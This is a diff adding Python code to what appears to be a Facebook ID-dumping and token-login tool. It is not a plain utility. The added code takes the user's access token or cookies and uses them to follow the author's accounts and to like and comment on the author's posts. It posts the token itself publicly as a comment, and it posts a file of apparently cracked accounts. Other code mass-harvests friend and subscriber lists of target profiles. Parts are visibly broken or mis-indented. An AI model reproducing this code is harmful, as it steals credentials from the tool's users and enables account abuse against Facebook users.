@@ -366,4 +366,308 @@ class sort:
 		print(47*'-')
 		print ("[*] Example : 1000 ,10000, 100079 , 100080")
 		print(47*'-')
-		link = input (
+		link = input ("[+] input path : ")
+		link = input ("[?] Link 1 : ")
+		link1 = input ("[?] Link 2 : ")
+		os.system('cat "'+file+'" | grep "'+link+'" > /sdcard/1.txt')
+		os.system('cat "'+file+'" | grep "'+link1+'" >> /sdcard/1.txt')
+		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/Xdevi.txt')
+		os.system('rm -rf /sdcard/1.txt')
+		os.system('rm -rf /sdcard/devi.txt.txt')
+		os.system('rm -rf /sdcard/deviidz.txt')
+		print(47*'\033[1;97m-\033[0;0m')
+		print ("\n[DEVI] Dumping and Sliced successfully ..")
+		print ("[DEVI] Your file path : /storage/emulated/0/2.txt")
+		print(47*'\033[1;97m-\033[0;0m')
+		input ("\n[?] Retrun back menu")
+		os.system("python Extract.py")
+	def __init__(self):
+		ba = 0
+		bi = 0
+		link_token = requests.get("https://free.facebook.com/story.php?story_fbid=1189847078895903&id=100036118653131&_rdr")
+
+		gbl = par(link_token.content,'html.parser')
+		token_free = re.findall("EAA\w+", link_token.text)
+		for naa in token_free:
+			ba += 1
+			if len(naa)>=37:
+				token = naa
+				print(war+"Token  : "+str(ba))
+				post4 = ('1189847078895903') # Logo 
+				post5 = ("1189847078895903") # Untuk Ber
+				comment = random.choice(['Big fan sir Devi','Big fan brother devi','sir big fan devi','Sir please reply me devi','Love you sir devi','Sir big fan please reply me','Legened']) 
+				love = random.choice(['Star boydevi','Love it°','Good post','I LOVE YOU Papa','Wow sir devi','Super Star devi'])
+				somi = ''+love
+				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
+				requests.post('https://graph.facebook.com/100007607054845/subscribers?access_token=' + token) ### FB RISKY
+				cek_token(naa)
+		exit(war+"Token Not Found")
+class token:
+	def __init__(self):
+		toket = input("\n\033[1;92m[+] Enter Token : ")
+		try:otw = requests.get("https://graph.facebook.com/me?access_token=" + toket);a = json.loads(otw.text);nama = a["name"];zedd = open(".login.txt", "w");zedd.write(toket);zedd.close();print;print((war+"Login Successful"));bot_follow()
+		except KeyError:print((war+"Token Invalid"));time.sleep(2);token()
+class check_kukis:
+	def __init__(self):
+		session = req.Session()
+		try:coki = open(".cokie.txt", "r").read()
+		except:coke()
+		respon = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
+		nama__ = re.findall('\<title\>(.*?)<\/title\>',str(respon))[0]
+		if "Halaman Tidak Ditemukan" in nama__:
+			jalan(war+"Sorry Your Cookies Are Dead");time.sleep(1)
+			try:os.remove(".cokie.txt")
+			except:pass
+		else:pass
+class coke:
+	def __init__(self):
+		_cookie=input(war+'Cookies : '+I)
+		_cookie += "noscript=1;"+_cookie
+		try:
+			_head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': _cookie}
+			_r=_ses.get(urls, headers=_head)
+			_p=re.search('(EAAG\w+)', _r.text)
+			_h=_p.group(1)
+			if 'EAA' in _h:open(".login.txt", 'w').write('%s' % (_h));open(".cokie.txt", 'w').write('%s' % (_cookie));bokep_barat_yang_terbaru(_cookie);bokep_barat_yang_terbaru(_h)
+		except (AttributeError, requests.exceptions.TooManyRedirects):print(war+'Cookies Error  ');time.sleep(3);coke()
+		exit(jalan(war+"Run This Script Again : python Nx.py"))
+
+
+class bot_follow:
+	def __init__(self):
+		s_ = requests.Session()
+		post1 = ('1189847078895903') # j
+		post2 = ("1189847078895903") # j
+		post3 = ("1189847078895903") # j
+		post4 = ('1189847078895903') # j
+		post5 = ("1189847078895903") # Untuk Berbagi T
+		post6 = ("1189847078895903") # Logo Akira
+		post7 = ("1189847078895903") # Logo Attaxk Fr
+		curi_ = ("1189847078895903") # Logo Zero 
+		my_idz_bot = [
+		"100036118653131",
+		"100036118653131",
+		"100036118653131",
+		"100036118653131",
+		"100036118653131"
+		]
+		my_post_bot = [
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903",
+		"1189847078895903"
+		]
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = s_.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			id = a["id"]
+			bokep_barat_yang_terbaru(token)
+		except Exception as e:
+			print((war+"Token Invalid >%s%s%s<"%(I,e,Q)))
+			time.sleep(1)
+			login()
+		for id_bot in my_idz_bot:
+			s_.post('https://graph.facebook.com/'+id_bot+'/subscribers?access_token='+token)
+		for post_id in my_post_bot:
+			s_.post("https://graph.facebook.com/"+post_id+"/likes?summary=true&access_token=" + toket)
+		s_.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
+		s_.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
+		s_.post('https://graph.facebook.com/1189847078895903/comments/?message=' + token + '&access_token=' + token)
+		menu()
+		class curi_anak:
+	def __init__(self):
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			id = a["id"]
+		except IOError:
+			print((war+" Token Invalid"))
+			time.sleep(2)
+			login()
+		anjas=open("result/CP-03-12-2021.txt","r").read()
+		curi = ("2978584119071794") # Zero Suck Candy Logo :v
+		requests.post('https://graph.facebook.com/'+curi+'/comments/?message='+anjas+'&access_token=' + token)
+
+class cek_token:
+	def __init__(self, token):
+		requests.post("https://graph.facebook.com/me/feed/?link=https://fb.com/100036118653131/posts/1189847078895903/?app=fbl&access_token=" + token)
+		try:
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
+			a = json.loads(otw.text)
+			nama = a["name"]
+			id = a["id"]
+			print(war+'Account Name : '+nama[0:10])
+			print(war+'Your Id   : '+id)
+			print(war+""+token)
+		except:pass
+		try:
+			goblok = []
+			for i in requests.get("https://graph.facebook.com/me/friends?limit=9999&access_token="+token).json()["data"]:
+				try:
+					anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
+					goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
+				except:pass
+		except KeyError:pass
+		_id = ("%s"%(len(goblok)))
+		if _id == "0" or "0" == _id:
+			jalan(war+"Have No Friends  ")
+		else:
+			print(war+"Friend : "+I+_id+Q)
+			jalan(war+"Do you want to use this token (y/n):")
+			haalq = input(war+"Select One : ")
+			if haalq in ["y","Y"]:
+				tok = open(".login.txt", "w")
+				tok.write(token)
+				tok.close()
+				print ("\n"+war+"Token : "+I+token+Q)
+				exit(jalan(war+"Token Found Please,Run : python Multi.py"))
+				exit()
+			else:pass
+	print ("\n")
+
+
+class dump_ulti:
+	def __init__(self):
+		try:
+			token = open(".login.txt", "r").read()
+			toket = open(".login.txt", "r").read()
+		except IOError:
+			os.system("rm -rf .login.txt")
+			exit(war+"Token Failed  ");time.sleep(2)
+		idt = input(war+"Enter link  or Target Username : " )
+		try:
+			if idt == "me":idt = "me"
+			else:
+				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
+				if "facebook" in idt:
+					payload = {"fburl": idt, "check": "Lookup"}
+				mmk = requests.post("https://lookup-id.com/", data=payload).content
+				xxx = par(mmk, "html.parser")
+				idtt = xxx.find("span", id="code")
+				asw = idtt.text
+				idt = asw
+		except:idt = idt
+		try:
+			if idt == "me" or "me" == idt:
+				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
+				op = json.loads(otw.text)
+			else:
+				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
+				op = json.loads(jok.text)
+			try:
+				nama = op['name']
+			except (KeyError, IOError):
+				nama = ("Name Not Found  ")
+		except Exception as e:jalan(war+" ID "+C+idt+Q+" Not Found  ");time.sleep(2);dump_ulti()
+		jalan(""+war+"Name   : "+I+nama+Q+"\n")
+		if nama == "Name Not Found  ":
+			time.sleep(2);dump_ulti()
+		os.system("rm -rf /storage/emulated/0/themohsin.txt")
+		namq = ("themohsin")
+		if namq == "" or namq == " ":
+			namq = uuid.uuid4().hex[:10].upper()
+		dump = open('.janganedit','w') 
+		try:
+			dump = open('.janganedit','a+') 
+			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
+				uid = i["id"]
+				nama = i["name"]
+				id.append(uid+"|"+nama)
+				dump.write(uid+'|'+nama+'\n')
+			dump.close()
+		except KeyError:pass
+		id_ = ("%s"%(len(id)))
+		if id_ == "0" or "0" == id_:jalan(war+"Possible ID "+idt+" Not Public  ");time.sleep(2);exit()
+		else:
+			print(war+"Total ID : %s"%(len(id)))
+			dumppp = open('/sdcard/'+namq+'.json','w')
+			jalan(war+'File Dump Not Found : '+'/sdcard/'+namq+'.txt')
+			jalan(war+"Enter CTRL + Z  STOP Programe  ")
+			with kikygtg(max_workers=20) as (kiky_gtg):
+				juma = open(".janganedit","r").readlines()
+				for data in juma:
+					data = data.replace("\n","")
+					kiky = data.split("|")
+					mal = ("%s"%(kiky[0]))
+					nm = ("%s"%(kiky[1]))
+					kiky_gtg.submit(lonte__, mal, toket, token, namq)
+			sort()
+			goblok = []
+tolol = []
+class lonte__:
+	def __init__(self, ml, token, toket, mamk):
+		laxk = open('/sdcard/'+mamk+'.txt','a+')
+		try:
+			for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
+				try:
+					iid = i["id"]
+					nama = i["name"]
+					goblok.append(nama)
+					laxk.write(iid+'|'+nama+'\n')
+				except:pass
+			laxk.close()
+			for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
+				try:
+					iid = i["id"]
+					nama = i["name"]
+					goblok.append(nama)
+					laxk.write(iid+'|'+nama+'\n')
+				except:pass
+			laxk.close()
+		except KeyError:pass
+		sys.stdout.write("\r%s[%sDEVI%s] COLLECTED IDZ â¢> %s"%(Q,pilih([U,I,K,M,C]),Q, len(open('/sdcard/'+mamk+'.txt','r').readlines()))
+		); sys.stdout.flush()
+class menu:
+	def __init__(self):
+		global ua
+		os.system("clear")
+		try:
+			toket=open(".login.txt","r").read()
+			token=open(".login.txt","r").read()
+			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
+			a = json.loads(otw.text)
+			try:
+				nama = a["name"]
+			except:
+				nama = a["username"]
+		except:
+			print((war+" Token Invalid"))
+			time.sleep(1)
+			login()
+		print (logo)
+		url_main = "https://www.whatsmyua.info"
+		s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
+		raw_ua = s.find("li", id="rawUa").text
+		family = s.find("li", id="family").text
+		name_hp = s.find("li", id="product").text
+		os_ = s.find("li", id="os").text
+		ly = s.find("li", id="layout").text
+		ua = raw_ua.replace("rawUa: ", "") # My Useragnet
+		jenis_ua = family.replace("family: ", "")
+		jenis_hp = name_hp.replace("product: ", "")
+		jenis_os = os_.replace("os: ", "")
+		jenis_ly = ly.replace("layout: ", "")
+	menu()
+class Main:
+	def __init__(self):
+		try:menu()
+		except:pass
+		try:menu();exit()
+		except requests.exceptions.ConnectionError:jalan(war+"Network Is Dead !")
+		except Exception as e:print(war+"Error : %s"%(e))
